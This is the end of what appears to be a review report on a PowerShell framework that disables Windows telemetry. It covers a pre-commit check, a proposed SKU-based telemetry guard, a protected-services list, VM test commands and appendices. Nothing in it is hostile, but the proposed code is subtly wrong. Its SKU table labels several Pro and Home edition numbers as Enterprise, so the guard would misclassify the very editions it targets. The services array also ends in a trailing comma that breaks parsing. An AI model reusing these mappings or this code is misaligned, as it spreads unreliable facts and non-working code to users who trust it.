CRLF_FILES=$(find . -name "*.ps1" -exec grep -l $'\r' {} \; 2>/dev/null || true)

if [ -n "$CRLF_FILES" ]; then
    echo "WARNING: Files with CRLF line endings (may cause issues):"
    echo "$CRLF_FILES"
    # Warning only, don't block commit
fi

exit 0
```

### Proposed SKU Guard Snippet

Add to `runtime/utils.ps1` and use in `modules/minimal/disable-telemetry/apply.ps1`:

```powershell
# AUTHOR: claude-reviewer
# SAFE: snapshot -> apply -> verify -> rollback
# RUN INSIDE WINDOWS VM OR CI ONLY

function Get-TelemetryMinimumValue {
    <#
    .SYNOPSIS
        Returns the minimum AllowTelemetry value supported by the current Windows SKU.

    .DESCRIPTION
        AllowTelemetry registry value is clamped by Windows based on edition:
        - Enterprise/Education: Can use 0 (Security - no telemetry)
        - Pro/Home: Minimum is 1 (Required Diagnostic Data)

        Setting 0 on Pro/Home is silently ignored by Windows.

    .OUTPUTS
        System.Int32. Returns 0 for Enterprise/Education, 1 for all others.

    .EXAMPLE
        $telemetryValue = Get-TelemetryMinimumValue
        Set-ItemProperty -Path $regPath -Name "AllowTelemetry" -Value $telemetryValue
    #>

    [CmdletBinding()]
    [OutputType([int])]
    param()

    # Get Operating System SKU
    # Reference: https://docs.microsoft.com/en-us/dotnet/api/microsoft.powershell.commands.operatingsystemsku
    $sku = (Get-CimInstance -ClassName Win32_OperatingSystem).OperatingSystemSKU

    # Enterprise and Education SKUs that support Security (0) telemetry level
    # 4   = Enterprise
    # 27  = Enterprise N
    # 48  = Enterprise Evaluation
    # 49  = Enterprise N Evaluation
    # 98  = Windows 10/11 Enterprise for Virtual Desktops
    # 100 = Enterprise LTSC
    # 101 = Enterprise N LTSC
    # 103 = Enterprise LTSC Evaluation
    # 104 = Enterprise N LTSC Evaluation
    # 121 = Education
    # 122 = Education N
    # 125 = Enterprise S
    # 126 = Enterprise S N
    # 129 = Enterprise S Evaluation
    # 130 = Enterprise S N Evaluation
    $enterpriseSKUs = @(4, 27, 48, 49, 98, 100, 101, 103, 104, 121, 122, 125, 126, 129, 130)

    if ($sku -in $enterpriseSKUs) {
        Write-Verbose "Enterprise/Education SKU detected (SKU=$sku). AllowTelemetry=0 (Security) is supported."
        return 0  # Security level - Enterprise/Education only
    }

    # Pro, Home, and other editions
    Write-Host "    [INFO] Non-Enterprise SKU detected (SKU=$sku)." -ForegroundColor Yellow
    Write-Host "    [INFO] Setting telemetry to 1 (Required Diagnostic Data - minimum for this edition)." -ForegroundColor Yellow
    return 1  # Required Diagnostic Data - lowest available for Pro/Home
}

function Get-WindowsEditionName {
    <#
    .SYNOPSIS
        Returns a friendly name for the current Windows edition.
    #>

    $sku = (Get-CimInstance -ClassName Win32_OperatingSystem).OperatingSystemSKU

    $skuNames = @{
        4   = 'Enterprise'
        27  = 'Enterprise N'
        48  = 'Enterprise Evaluation'
        49  = 'Enterprise N Evaluation'
        98  = 'Enterprise for Virtual Desktops'
        100 = 'Enterprise LTSC'
        101 = 'Enterprise N LTSC'
        121 = 'Education'
        122 = 'Education N'
        125 = 'Enterprise S'
        126 = 'Enterprise S N'
        1   = 'Ultimate'
        30  = 'Pro'
        31  = 'Pro N'
        36  = 'Pro Evaluation'
        84  = 'Pro Workstation'
        2   = 'Home Basic'
        3   = 'Home Premium'
        5   = 'Home Basic N'
        6   = 'Business'
    }

    if ($skuNames.ContainsKey($sku)) {
        return $skuNames[$sku]
    }

    return "Unknown (SKU=$sku)"
}
```

### Proposed Protected Services List

Add to `runtime/godmode.ps1` and `runtime/utils.ps1`:

```powershell
# AUTHOR: claude-reviewer
# SAFE: These services must NEVER be modified
# RUN INSIDE WINDOWS VM OR CI ONLY

# Services that are ABSOLUTELY PROTECTED per CLAUDE.md
# Modifying any of these will break Windows Update, security, or stability
$script:PROTECTED_SERVICES = @(
    # Windows Update infrastructure
    'wuauserv',           # Windows Update
    'WaaSMedicSvc',       # Windows Update Medic Service
    'UsoSvc',             # Update Orchestrator Service
    'BITS',               # Background Intelligent Transfer Service
    'TrustedInstaller',   # Windows Modules Installer
    'msiserver',          # Windows Installer

    # Security infrastructure
    'WinDefend',          # Windows Defender Antivirus Service
    'SecurityHealthService', # Windows Security Center
    'wscsvc',             # Security Center
    'SamSs',              # Security Accounts Manager
    'VaultSvc',           # Credential Manager
    'Netlogon',           # Net Logon

    # Core system
    'RpcSs',              # Remote Procedure Call
    'RpcEptMapper',       # RPC Endpoint Mapper
    'DcomLaunch',         # DCOM Server Process Launcher
    'PlugPlay',           # Plug and Play
    'Winmgmt',            # WMI
    'Schedule',           # Task Scheduler
    'EventLog',           # Windows Event Log
    'Power',              # Power
    'ProfSvc',            # User Profile Service
    'LSM',                # Local Session Manager
    'Wcmsvc',             # Windows Connection Manager

    # Networking core
    'Dnscache',           # DNS Client
    'NlaSvc',             # Network Location Awareness
    'Dhcp',               # DHCP Client
    'nsi',                # Network Store Interface Service
    'BFE',                # Base Filtering Engine
    'mpssvc',             # Windows Defender Firewall

    # Storage
    'VSS',                # Volume Shadow Copy
    'StorSvc',            # Storage Service
)

function Test-ProtectedService {
    <#
    .SYNOPSIS
        Checks if a service name is in the protected list.

    .PARAMETER ServiceName
        The service name to check.

    .OUTPUTS
        Boolean. True if protected, False otherwise.
    #>
    param(
        [Parameter(Mandatory)]
        [string]$ServiceName
    )

    return $ServiceName -in $script:PROTECTED_SERVICES
}

function Assert-NotProtectedService {
    <#
    .SYNOPSIS
        Throws if attempting to modify a protected service.
    #>
    param(
        [Parameter(Mandatory)]
        [string]$ServiceName,

        [string]$Operation = "modify"
    )

    if (Test-ProtectedService -ServiceName $ServiceName) {
        $errorMsg = @"
BLOCKED: Cannot $Operation protected service '$ServiceName'.

This service is critical for Windows stability per CLAUDE.md specification.
Modifying it could break Windows Update, security, or system stability.

If you believe this is an error, review CLAUDE.md "Absolute Protected Windows Components".
"@
        throw $errorMsg
    }
}
```

---

## Exact Commands to Run in VM

The following commands are intended to run inside a Windows VM or CI environment for testing.

```powershell
# RUN INSIDE WINDOWS VM OR CI ONLY

#===============================================================================
# VALIDATION COMMANDS - Run these to verify the current state
#===============================================================================

# Check Windows edition and SKU
$os = Get-CimInstance Win32_OperatingSystem
Write-Host "Edition: $($os.Caption)"
Write-Host "SKU: $($os.OperatingSystemSKU)"
Write-Host "Version: $($os.Version)"

# Check PowerShell version (must be 5.1 for compatibility)
$PSVersionTable.PSVersion

# Check if running as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host "Running as Administrator: $isAdmin"

#===============================================================================
# PRE-FLIGHT CHECKS - Run before applying any modules
#===============================================================================

# Create required directories
$directories = @(
    'C:\ProgramData\WinOptimizer\backup',
    'C:\ProgramData\WinOptimizer\logs',
    'C:\ProgramData\WinOptimizer\state'
)
foreach ($dir in $directories) {
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
        Write-Host "Created: $dir"
    }
}

# Create system restore point (if supported)
try {
    Checkpoint-Computer -Description "Pre-WinOptimizer" -RestorePointType MODIFY_SETTINGS -ErrorAction Stop
    Write-Host "System restore point created" -ForegroundColor Green
} catch {
    Write-Host "System restore not available: $($_.Exception.Message)" -ForegroundColor Yellow
}

#===============================================================================
# MODULE TESTING - Test individual modules
#===============================================================================

# Test disable-telemetry module
$modulePath = ".\modules\minimal\disable-telemetry"

# Preview
& "$modulePath\preview.ps1"

# Apply with verbose output
& "$modulePath\apply.ps1" -Verbose

# Verify
& "$modulePath\verify.ps1"

# Rollback
& "$modulePath\rollback.ps1"

#===============================================================================
# FULL LAYER TESTING - Test entire layers in sequence
#===============================================================================

# Test Minimal layer
.\runtime\godmode.ps1 -Layer Minimal -Preview

# Apply Minimal layer
.\runtime\godmode.ps1 -Layer Minimal -Apply

# Verify Minimal layer
.\runtime\godmode.ps1 -Layer Minimal -Verify

# Rollback Minimal layer
.\runtime\godmode.ps1 -Layer Minimal -Rollback

#===============================================================================
# FIREWALL MODULE SPECIFIC TESTS
#===============================================================================

# Before applying - check current firewall rules
Get-NetFirewallRule -DisplayName "WinOptimizer*" -ErrorAction SilentlyContinue

# Test DNS resolution (what the module SHOULD do)
$hosts = @(
    'vortex-win.data.microsoft.com',
    'settings-win.data.microsoft.com',
    'watson.telemetry.microsoft.com'
)
foreach ($h in $hosts) {
    try {
        $ips = (Resolve-DnsName -Name $h -Type A -ErrorAction Stop).IPAddress
        Write-Host "$h -> $($ips -join ', ')" -ForegroundColor Green
    } catch {
        Write-Host "$h -> FAILED TO RESOLVE" -ForegroundColor Red
    }
}

# After applying - verify rules exist and have valid IPs
$rules = Get-NetFirewallRule -DisplayName "WinOptimizer*" -ErrorAction SilentlyContinue
foreach ($rule in $rules) {
    $addresses = (Get-NetFirewallAddressFilter -AssociatedNetFirewallRule $rule).RemoteAddress
    Write-Host "$($rule.DisplayName): $($addresses -join ', ')"
}

# Test Microsoft Store connectivity (should work even with telemetry blocked)
Test-NetConnection -ComputerName "www.microsoft.com" -Port 443

#===============================================================================
# WINDOWS UPDATE VERIFICATION - Critical post-change check
#===============================================================================

# Check Windows Update service status
Get-Service -Name wuauserv, WaaSMedicSvc, UsoSvc | Select-Object Name, Status, StartType

# Check for Windows Update health
$updateSession = New-Object -ComObject Microsoft.Update.Session
$updateSearcher = $updateSession.CreateUpdateSearcher()
try {
    $searchResult = $updateSearcher.Search("IsInstalled=0")
    Write-Host "Windows Update check: $($searchResult.Updates.Count) updates available" -ForegroundColor Green
} catch {
    Write-Host "Windows Update check FAILED: $($_.Exception.Message)" -ForegroundColor Red
}

#===============================================================================
# ROLLBACK STATE VERIFICATION
#===============================================================================

# Check state files
Get-ChildItem "C:\ProgramData\WinOptimizer\state" -Filter "*.json" | ForEach-Object {
    Write-Host "`n=== $($_.Name) ===" -ForegroundColor Cyan
    Get-Content $_.FullName | ConvertFrom-Json | Format-List
}

# Check backup directories
Get-ChildItem "C:\ProgramData\WinOptimizer\backup" -Directory -Recurse -Depth 1 |
    Select-Object FullName, CreationTime |
    Sort-Object CreationTime -Descending

#===============================================================================
# CLEANUP COMMANDS - Run after testing
#===============================================================================

# Rollback all changes (in reverse order)
.\runtime\godmode.ps1 -Layer GodMode -Rollback
.\runtime\godmode.ps1 -Layer Ultimate -Rollback
.\runtime\godmode.ps1 -Layer Moderate -Rollback
.\runtime\godmode.ps1 -Layer Minimal -Rollback

# Verify services are restored
Get-Service | Where-Object { $_.StartType -eq 'Disabled' } |
    Select-Object Name, Status, StartType |
    Format-Table

# Remove state and backup directories (CAUTION)
# Remove-Item "C:\ProgramData\WinOptimizer" -Recurse -Force
```

---

## Appendix A: File Inventory

### Module Files by Layer

```
modules/
├── minimal/
│   ├── disable-telemetry/
│   │   ├── apply.ps1
│   │   ├── metadata.yaml
│   │   ├── preview.ps1
│   │   ├── rollback.ps1
│   │   └── verify.ps1
│   └── disable-widgets/
│       ├── apply.ps1
│       ├── metadata.yaml
│       ├── preview.ps1
│       ├── rollback.ps1
│       └── verify.ps1
├── moderate/
│   └── disable-xbox-services/
│       ├── apply.ps1
│       ├── metadata.yaml
│       ├── preview.ps1
│       ├── rollback.ps1
│       └── verify.ps1
├── ultimate/
│   └── firewall-telemetry-blocking/
│       ├── apply.ps1
│       ├── metadata.yaml
│       ├── preview.ps1
│       ├── rollback.ps1
│       └── verify.ps1
└── godmode/
    └── disable-wer/
        ├── apply.ps1
        ├── metadata.yaml
        ├── preview.ps1
        ├── rollback.ps1
        └── verify.ps1
```

### Runtime Files

```
runtime/
├── godmode.ps1     # Main orchestrator (1078 lines)
└── utils.ps1       # Utility functions (423 lines)
```

### Layer Manifests

```
layers/
├── minimal.yaml
├── moderate.yaml
├── ultimate.yaml
└── godmode.yaml
```

---

## Appendix B: Glossary

| Term | Definition |
|------|------------|
| **AllowTelemetry** | Registry value controlling Windows diagnostic data level (0=Security, 1=Required, 2=Enhanced, 3=Full) |
| **AppX** | Modern Windows app packaging format (UWP apps) |
| **DiagTrack** | Connected User Experiences and Telemetry service |
| **GodMode** | Most aggressive optimization layer in this framework |
| **Provisioned Package** | AppX package installed for all users by default |
| **SKU** | Stock Keeping Unit - identifies Windows edition (Home, Pro, Enterprise, etc.) |
| **WaaSMedicSvc** | Windows Update Medic Service - repairs Windows Update components |
| **WER** | Windows Error Reporting |

---

## Appendix C: References

1. CLAUDE.md - Project architecture specification
2. Microsoft Docs - AllowTelemetry policy: https://docs.microsoft.com/en-us/windows/privacy/configure-windows-diagnostic-data-in-your-organization
3. Microsoft Docs - Operating System SKU values: https://docs.microsoft.com/en-us/dotnet/api/microsoft.powershell.commands.operatingsystemsku
4. Microsoft Telemetry Endpoints: https://docs.microsoft.com/en-us/windows/privacy/manage-windows-endpoints

---

## Document History

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2026-03-12 | Security Auditor | Initial comprehensive review |

---

**End of Report**
